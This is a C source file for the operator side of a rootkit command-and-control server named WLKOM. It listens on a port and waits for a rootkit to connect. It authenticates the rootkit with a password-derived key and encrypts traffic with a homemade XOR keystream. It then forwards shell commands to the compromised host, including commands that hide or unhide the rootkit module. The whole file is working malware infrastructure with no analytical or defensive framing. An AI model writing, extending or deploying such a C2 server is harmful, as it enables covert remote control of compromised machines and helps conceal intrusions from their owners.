#include <arpa/inet.h>
#include <errno.h>
#include <netinet/in.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/select.h>
#include <sys/socket.h>
#include <time.h>
#include <termios.h>
#include <unistd.h>

#define BUF_SIZE     256
#define FNV1A_OFFSET 2166136261U
#define FNV1A_PRIME  16777619U
#define AUTH_REPLY_TIMEOUT_SEC 3

static void timestamp(void)
{
    time_t t = time(NULL);
    struct tm *tm = localtime(&t);
    char buf[32];
    strftime(buf, sizeof(buf), "%H:%M:%S", tm);
    printf("[%s] ", buf);
}

static uint32_t fnv1a_hash(const char *str)
{
    uint32_t hash = FNV1A_OFFSET;

    while (*str) {
        hash ^= (unsigned char)*str;
        hash *= FNV1A_PRIME;
        str++;
    }

    return hash;
}

static int write_all(int fd, const char *buf, size_t len)
{
    while (len > 0) {
        ssize_t written = write(fd, buf, len);

        if (written <= 0)
            return -1;

        buf += written;
        len -= written;
    }

    return 0;
}

static uint8_t keystream_byte(uint32_t key, uint32_t pos)
{
    uint32_t x = key + pos * 0x9E3779B1U;

    x ^= x >> 16;
    x *= 0x85ebca6bU;
    x ^= x >> 13;
    x *= 0xc2b2ae35U;
    x ^= x >> 16;

    return (uint8_t)x;
}

static void crypt_buffer(char *buf, size_t len, uint32_t key, uint32_t *pos)
{
    while (len-- > 0) {
        *buf++ ^= keystream_byte(key, *pos);
        (*pos)++;
    }
}

static int write_encrypted(int fd, const char *buf, size_t len,
                           uint32_t key, uint32_t *pos)
{
    char tmp[BUF_SIZE];

    if (len > sizeof(tmp))
        return -1;

    memcpy(tmp, buf, len);
    crypt_buffer(tmp, len, key, pos);
    return write_all(fd, tmp, len);
}

static int read_encrypted_line(int fd, char *buf, size_t size,
                               uint32_t key, uint32_t *pos)
{
    size_t rn = 0;

    while (rn + 1 < size) {
        fd_set readfds;
        struct timeval timeout = {
            .tv_sec = AUTH_REPLY_TIMEOUT_SEC,
            .tv_usec = 0,
        };
        int ready;
        ssize_t n;

        FD_ZERO(&readfds);
        FD_SET(fd, &readfds);

        ready = select(fd + 1, &readfds, NULL, NULL, &timeout);
        if (ready == 0)
            return -1;
        if (ready < 0) {
            if (errno == EINTR)
                continue;
            return -1;
        }

        n = read(fd, &buf[rn], 1);
        if (n <= 0)
            return -1;

        crypt_buffer(&buf[rn], 1, key, pos);
        if (buf[rn] == '\n') {
            buf[rn] = '\0';
            if (rn > 0 && buf[rn - 1] == '\r')
                buf[rn - 1] = '\0';
            return 0;
        }

        rn++;
    }

    buf[rn] = '\0';
    return -1;
}

static int wait_for_command_or_disconnect(int client_fd)
{
    while (1) {
        fd_set readfds;
        int max_fd = client_fd > STDIN_FILENO ? client_fd : STDIN_FILENO;
        int ret;

        FD_ZERO(&readfds);
        FD_SET(STDIN_FILENO, &readfds);
        FD_SET(client_fd, &readfds);

        ret = select(max_fd + 1, &readfds, NULL, NULL, NULL);
        if (ret < 0)
            return -1;

        if (FD_ISSET(client_fd, &readfds)) {
            char probe;
            ssize_t n = recv(client_fd, &probe, 1, MSG_PEEK);

            if (n <= 0)
                return 0;
        }

        if (FD_ISSET(STDIN_FILENO, &readfds))
            return 1;
    }
}

static int read_password(char *buf, size_t size)
{
    struct termios old_term, new_term;
    int hide_input = isatty(STDIN_FILENO) &&
        tcgetattr(STDIN_FILENO, &old_term) == 0;

    printf("WLKOM password: ");
    fflush(stdout);

    if (hide_input) {
        new_term = old_term;
        new_term.c_lflag &= ~ECHO;
        tcsetattr(STDIN_FILENO, TCSAFLUSH, &new_term);
    }

    if (fgets(buf, size, stdin) == NULL) {
        if (hide_input) {
            tcsetattr(STDIN_FILENO, TCSAFLUSH, &old_term);
            printf("\n");
        }
        return -1;
    }

    if (hide_input) {
        tcsetattr(STDIN_FILENO, TCSAFLUSH, &old_term);
        printf("\n");
    }

    buf[strcspn(buf, "\r\n")] = '\0';
    return buf[0] == '\0' ? -1 : 0;
}

int main(int argc, char **argv)
{
    int port;
    char password[BUF_SIZE];
    int server_fd, client_fd;
    struct sockaddr_in server_addr = { 0 }, client_addr = { 0 };
    socklen_t client_len = sizeof(client_addr);
    char buf[BUF_SIZE];
    char auth_msg[BUF_SIZE];
    char auth_reply[BUF_SIZE];
    uint32_t session_key = 0;
    uint32_t tx_pos = 0, rx_pos = 0;
    int opt = 1;

    if (argc != 2) {
        fprintf(stderr, "Usage: %s <port>\n", argv[0]);
        return 1;
    }

    port = atoi(argv[1]);
    if (port <= 0) {
        fprintf(stderr, "Invalid port\n");
        return 1;
    }

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        perror("socket");
        return 1;
    }

    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    server_addr.sin_family      = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY;
    server_addr.sin_port        = htons(port);

    if (bind(server_fd, (struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
        perror("bind");
        return 1;
    }

    if (listen(server_fd, 1) < 0) {
        perror("listen");
        return 1;
    }

    printf("C2 listening on port %d\n", port);

    while (1) {
        timestamp();
        printf("[?] Waiting for rootkit connection...\n");
        fflush(stdout);

        client_fd = accept(server_fd, (struct sockaddr *)&client_addr, &client_len);
        if (client_fd < 0) {
            perror("accept");
            continue;
        }

        timestamp();
        printf("[+] Rootkit connected from %s\n", inet_ntoa(client_addr.sin_addr));
        fflush(stdout);

        if (read_password(password, sizeof(password)) < 0) {
            timestamp();
            printf("[-] Empty password or input closed\n");
            fflush(stdout);
            close(client_fd);
            continue;
        }

        session_key = fnv1a_hash(password);
        tx_pos = rx_pos = 0;
        snprintf(auth_msg, sizeof(auth_msg), "AUTH %08x\n", session_key);
        if (write_encrypted(client_fd, auth_msg, strlen(auth_msg),
                            session_key, &tx_pos) < 0) {
            perror("write AUTH");
            close(client_fd);
            continue;
        }

        timestamp();
        printf("[+] AUTH sent\n");
        fflush(stdout);

        if (read_encrypted_line(client_fd, auth_reply, sizeof(auth_reply),
                                session_key, &rx_pos) < 0 ||
            strcmp(auth_reply, "AUTH_OK") != 0) {
            timestamp();
            printf("[-] Authentication failed: invalid password or connection lost\n");
            fflush(stdout);
            close(client_fd);
            continue;
        }

        timestamp();
        printf("[+] Authentication accepted\n");
        fflush(stdout);

        printf("\n=== WLKOM INTERACTIVE SHELL ===\n");
        printf("Type your command and press Enter. Type 'exit' to quit.\n\n");
        printf("Control commands: hide_module, unhide_module, module_status.\n\n");

        while (1) {
            int ready;
            int connection_lost = 0;

            printf("c2_shell> ");
            fflush(stdout);

            ready = wait_for_command_or_disconnect(client_fd);
            if (ready <= 0) {
                if (ready == 0)
                    printf("\n[!] Connection lost or rootkit disconnected.\n");
                break;
            }

            /* 1. Read command from operator terminal */
            if (fgets(buf, sizeof(buf), stdin) == NULL) {
                break;
            }

            if (strncmp(buf, "exit", 4) == 0) {
                printf("Exiting interactive shell...\n");
                break;
            }

            if (buf[0] == '\n') {
                continue;
            }

            /* 2. Forward the command payload to the rootkit module */
            if (write_encrypted(client_fd, buf, strlen(buf),
                                session_key, &tx_pos) < 0) {
                printf("\n[!] Connection lost or rootkit disconnected.\n");
                break;
            }

            /* 3. Read stream until the specific end of output marker is detected */
            {
                char tail[32] = { 0 };
                char combined[BUF_SIZE + sizeof(tail)];

                while (1) {
                    ssize_t n;

                    memset(buf, 0, sizeof(buf));
                    n = read(client_fd, buf, sizeof(buf) - 1);
                    if (n <= 0) {
                        printf("\n[!] Connection lost or rootkit disconnected.\n");
                        connection_lost = 1;
                        break;
                    }

                    crypt_buffer(buf, n, session_key, &rx_pos);
                    buf[n] = '\0';
                    printf("%s", buf);
                    fflush(stdout);

                    /* Check sentinel across chunk boundary to handle TCP fragmentation */
                    snprintf(combined, sizeof(combined), "%s%s", tail, buf);
                    if (strstr(combined, "--- End of Output ---\n\n") != NULL)
                        break;

                    size_t copy_len = (size_t)n < sizeof(tail) - 1
                                      ? (size_t)n : sizeof(tail) - 1;
                    memcpy(tail, buf + n - copy_len, copy_len);
                    tail[copy_len] = '\0';
                }
            }

            if (connection_lost)
                break;
        }

        timestamp();
        printf("[-] Rootkit disconnected\n");
        fflush(stdout);

        close(client_fd);
    }

    close(server_fd);
    return 0;
}
